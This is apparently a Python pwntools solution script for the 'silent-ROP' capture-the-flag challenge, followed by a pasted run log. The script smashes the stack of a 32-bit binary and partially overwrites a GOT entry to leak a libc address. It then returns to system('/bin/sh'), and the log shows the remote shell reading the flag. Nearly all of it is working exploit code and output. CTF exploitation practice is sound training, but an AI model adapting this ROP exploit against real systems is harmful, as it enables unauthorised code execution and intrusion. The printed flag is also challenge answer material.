from pwn import *

context(os='linux', arch='i386')
#context.log_level = 'debug'

BINARY = './silent-ROP'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "ctf.k3rn3l4rmy.com"
  PORT = 2202
  s = remote(HOST, PORT)
  libc = ELF("./libc.so.6")
else:
  s = process(BINARY)
  libc = elf.libc

read_plt = 0x8049074

buf  = b"A"*28
buf += p32(read_plt)
buf += p32(elf.sym.main)
buf += p32(0)
buf += p32(elf.got.setvbuf)
buf += p32(2)
s.sendline(buf)

sleep(0.2)
s.send("\xd0\x7c")

s.recv(4)
stdin_addr  = u32(s.recv(4))
libc_base   = stdin_addr - 0x1eb5c7
system_addr = libc_base + libc.sym.system
binsh_addr  = libc_base + next(libc.search(b'/bin/sh'))
print("libc_base =", hex(libc_base))

buf  = b"A"*28
buf += p32(system_addr)
buf += b"BBBB"
buf += p32(binsh_addr)
s.sendline(buf)
  
s.interactive()

'''
mito@ubuntu:~/CTF/K3RN3LCTF/Pwn_silent-ROP$ python3 solve.py r
[*] '/home/mito/CTF/K3RN3LCTF/Pwn_silent-ROP/silent-ROP'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to ctf.k3rn3l4rmy.com on port 2202: Done
[*] '/home/mito/CTF/K3RN3LCTF/Pwn_silent-ROP/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
solve.py:29: BytesWarning: Text is not bytes; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes
  s.send("\xd0\x7c")
libc_base = 0xf7ce6000
[*] Switching to interactive mode
$                              id
uid=1000 gid=1000 groups=1000
$ ls -l
total 2180
-rw-rw-r-- 1 nobody nogroup      44 Nov 11 02:58 flag.txt
-rwxrwxr-x 1 nobody nogroup  180628 Nov 11 02:58 ld-2.31.so
-rwxrwxr-x 1 nobody nogroup 2022760 Nov 11 02:58 libc.so.6
-rwxrwxr-x 1 nobody nogroup   19728 Nov 11 23:03 run
$ 
$ cat flag.txt
flag{r3t_2_dl_r3s0lve_d03s_n0t_n3ed_a_l34k}
'''
